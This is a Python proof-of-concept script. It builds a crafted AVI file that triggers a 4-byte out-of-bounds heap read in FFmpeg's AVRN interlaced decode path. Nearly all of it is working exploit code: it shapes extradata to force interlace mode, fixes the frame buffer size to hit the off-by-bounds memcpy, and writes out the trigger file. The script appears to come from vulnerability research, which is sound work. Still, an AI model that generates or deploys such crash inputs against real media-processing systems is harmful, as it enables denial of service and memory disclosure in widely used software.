#!/usr/bin/env python3
"""
PoC generator for OOB Heap Read in AVRN Interlaced Decode Path
CWE: CWE-125 (Out-of-bounds Read)
File: libavcodec/avrndec.c, decode_frame(), lines 71-77

Trigger: buf_size == 2*width*height exactly so true_height==height,
causing the last loop iteration's second memcpy to read 4 bytes OOB.
"""

import struct
import os

# Parameters
WIDTH  = 100
HEIGHT = 4
BUF_SIZE = 2 * WIDTH * HEIGHT  # 800 bytes exactly

# -----------------------------------------------------------------
# Build extradata to trigger interlace mode in init()
#
#   Conditions checked in init():
#     1. avctx->extradata_size >= 9
#     2. avctx->extradata[4]+28 < avctx->extradata_size
#     3. !memcmp(extradata + ndx, "1:1(", 4)  where ndx = extradata[4]+4
#
#   Strategy:
#     Set extradata[4] = 5  =>  ndx = 9
#     Set extradata[9..12] = b"1:1("
#     Need extradata_size > 5+28 = 33  =>  use 37 bytes
#     tff: extradata[ndx+24] = extradata[33]; set to 0
# -----------------------------------------------------------------
K = 5
NDX = K + 4   # = 9
EXTRA_LEN = NDX + 28  # = 37, satisfies: 5+28=33 < 37 ✓

extradata = bytearray(EXTRA_LEN)
extradata[4] = K
extradata[NDX:NDX+4] = b"1:1("
extradata[NDX + 24] = 0   # tff = 0

assert EXTRA_LEN > K + 28, "extradata size check"
assert extradata[NDX:NDX+4] == b"1:1(", "magic check"

# -----------------------------------------------------------------
# Video frame data: exactly BUF_SIZE bytes
# -----------------------------------------------------------------
frame_data = bytes(BUF_SIZE)


def chunk(tag, data):
    """Build a RIFF chunk: fourcc(4) + size(4) + data; size not including padding."""
    if isinstance(tag, str):
        tag = tag.encode('ascii')
    size = len(data)
    out = tag + struct.pack('<I', size) + data
    if size % 2:
        out += b'\x00'  # pad to even
    return out


def list_chunk(list_type, *children):
    """Build a LIST chunk."""
    if isinstance(list_type, str):
        list_type = list_type.encode('ascii')
    inner = list_type + b''.join(children)
    return b'LIST' + struct.pack('<I', len(inner)) + inner


def riff_chunk(riff_type, *children):
    """Build the top-level RIFF chunk."""
    if isinstance(riff_type, str):
        riff_type = riff_type.encode('ascii')
    inner = riff_type + b''.join(children)
    return b'RIFF' + struct.pack('<I', len(inner)) + inner


# ---- avih (main AVI header, 56 bytes) ----
# struct MainAVIHeader: 14 DWORDs = 56 bytes
avih_data = struct.pack('<14I',
    40000,        # dwMicroSecPerFrame  (25 fps)
    BUF_SIZE*25,  # dwMaxBytesPerSec
    0,            # dwPaddingGranularity
    0x10,         # dwFlags (AVIF_HASINDEX)
    1,            # dwTotalFrames
    0,            # dwInitialFrames
    1,            # dwStreams
    BUF_SIZE,     # dwSuggestedBufferSize
    WIDTH,        # dwWidth
    HEIGHT,       # dwHeight
    0, 0, 0, 0,   # dwReserved[4]
)
assert len(avih_data) == 56
avih = chunk('avih', avih_data)

# ---- strh (video stream header) ----
# AVIStreamHeader:
#   fccType(4) + fccHandler(4) + dwFlags(4) + wPriority(2) + wLanguage(2)
#   + dwInitialFrames(4) + dwScale(4) + dwRate(4) + dwStart(4) + dwLength(4)
#   + dwSuggestedBufferSize(4) + dwQuality(4) + dwSampleSize(4)
#   + rcFrame: short left(2)+top(2)+right(2)+bottom(2)
# Total: 4+4+4+2+2+4+4+4+4+4+4+4+4+8 = 56 bytes
strh_data = (
    b'vids'                          # fccType
    + b'AVRN'                        # fccHandler
    + struct.pack('<IHH',
        0,   # dwFlags
        0,   # wPriority
        0,   # wLanguage
    )
    + struct.pack('<IIIII',
        0,         # dwInitialFrames
        1,         # dwScale
        25,        # dwRate
        0,         # dwStart
        1,         # dwLength
    )
    + struct.pack('<IiI',
        BUF_SIZE,  # dwSuggestedBufferSize
        -1,        # dwQuality
        0,         # dwSampleSize
    )
    + struct.pack('<4H',
        0, 0, WIDTH, HEIGHT,  # rcFrame
    )
)
assert len(strh_data) == 56, f"strh_data length={len(strh_data)}"
strh = chunk('strh', strh_data)

# ---- strf (BITMAPINFOHEADER + extradata) ----
# BITMAPINFOHEADER = 40 bytes exactly:
#   biSize(4) + biWidth(4) + biHeight(4) + biPlanes(2) + biBitCount(2)
#   + biCompression(4) + biSizeImage(4) + biXPelsPerMeter(4)
#   + biYPelsPerMeter(4) + biClrUsed(4) + biClrImportant(4)
bih = (
    struct.pack('<I', 40)               # biSize
    + struct.pack('<ii', WIDTH, HEIGHT) # biWidth, biHeight
    + struct.pack('<HH', 1, 16)         # biPlanes, biBitCount
    + b'AVRN'                           # biCompression (FourCC)
    + struct.pack('<IiiiII',
        BUF_SIZE,  # biSizeImage
        0,         # biXPelsPerMeter
        0,         # biYPelsPerMeter
        0,         # biClrUsed
        0,         # biClrImportant
        0,         # padding to reach 40 bytes
    )
)
# 4+8+4+4+24 = 44... let me recount:
# struct.pack('<I',40) = 4
# struct.pack('<ii',W,H) = 8
# struct.pack('<HH',1,16) = 4
# b'AVRN' = 4
# struct.pack('<IiiiII', ...) = 4+4+4+4+4+4 = 24
# Total = 4+8+4+4+24 = 44 -- too long by 4

bih = (
    struct.pack('<I', 40)               # biSize (4)
    + struct.pack('<ii', WIDTH, HEIGHT) # biWidth, biHeight (8)
    + struct.pack('<HH', 1, 16)         # biPlanes, biBitCount (4)
    + b'AVRN'                           # biCompression (4)
    + struct.pack('<IiiiI',
        BUF_SIZE,  # biSizeImage (4)
        0,         # biXPelsPerMeter (4)
        0,         # biYPelsPerMeter (4)
        0,         # biClrUsed (4)
        0,         # biClrImportant (4)
    )
)
# 4+8+4+4 + 5*4 = 20 + 20 = 40 ✓
assert len(bih) == 40, f"bih length={len(bih)}"

strf_data = bih + bytes(extradata)
strf = chunk('strf', strf_data)

# ---- strl list ----
strl = list_chunk('strl', strh, strf)

# ---- hdrl list ----
hdrl = list_chunk('hdrl', avih, strl)

# ---- video frame in movi ----
frame_chunk = chunk('00dc', frame_data)
movi = list_chunk('movi', frame_chunk)

# ---- idx1 (legacy index) ----
# offset is relative to after the 'movi' LIST header's type field
# LIST(4)+size(4)+type(4) = 12 bytes for movi header
# frame_chunk starts right after 'movi' fourcc, so offset from data start = 4
idx1_entry = struct.pack('<4sIII',
    b'00dc',
    0x10,        # AVIIF_KEYFRAME
    4,           # offset from start of movi data
    BUF_SIZE,    # chunk size
)
idx1 = chunk('idx1', idx1_entry)

# ---- Top-level RIFF AVI ----
avi = riff_chunk('AVI ', hdrl, movi, idx1)

outfile = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001_input.avi')
with open(outfile, 'wb') as f:
    f.write(avi)

print(f"[+] Written {len(avi)} bytes to {outfile}")
print(f"[+] Width={WIDTH}, Height={HEIGHT}, buf_size={BUF_SIZE}")
print(f"[+] Extradata ({len(extradata)} bytes): {extradata.hex()}")
print(f"[+] Interlace trigger: extradata[4]={K}, ndx={NDX}, magic='{extradata[NDX:NDX+4].decode()}'")
print(f"[+] OOB: last iteration second memcpy reads offsets 604-803, buf_size=800 => 4 bytes past end")
